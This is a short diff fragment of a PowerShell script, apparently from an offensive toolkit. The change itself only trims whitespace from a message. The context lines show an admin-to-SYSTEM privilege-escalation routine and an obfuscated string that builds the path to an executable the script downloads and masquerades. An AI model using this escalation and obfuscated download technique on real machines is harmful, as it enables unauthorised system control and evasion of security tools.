@@ -198,7 +198,7 @@ If($Action -ieq "Elevate"){
 
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
    If($IsClientAdmin){## From administrator => NT AUTHORITY\SYSTEM
-      Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
+      Write-Host "[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
    
       ## Download and masquerade the required standalone executable
       $Cristovao = "r0$!0&@t-3$!xp&@10i$!t/re&@dpi$!ll/" + "m$!a&@in/u$!t&@ils/N$!&@Su&@$!d&@o.e$!x&@e" -Join ''
